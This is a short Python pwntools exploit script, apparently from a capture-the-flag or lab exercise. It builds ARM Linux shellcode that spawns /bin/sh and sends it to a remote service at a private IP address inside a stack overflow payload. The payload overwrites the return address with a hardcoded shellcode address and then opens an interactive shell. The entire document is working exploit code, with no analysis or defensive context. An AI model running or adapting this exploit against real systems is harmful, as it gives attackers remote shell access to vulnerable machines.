from pwn import *
shellcode = shellcraft.arm.linux.sh()
print shellcode
shellcode = asm(shellcode, arch = 'arm', os = 'linux', bits=32)
print shellcode.encode('hex')




r = remote('192.168.1.101', 8888)

shellcode_addr = 0xbefff888

payload  = ''
payload += 'a'*0x8
payload += 'b'*0x8
payload += 'c'*0x4
payload += p32(shellcode_addr)
payload += p32(shellcode_addr)
payload += shellcode
raw_input()
r.sendline(payload)
r.interactive()
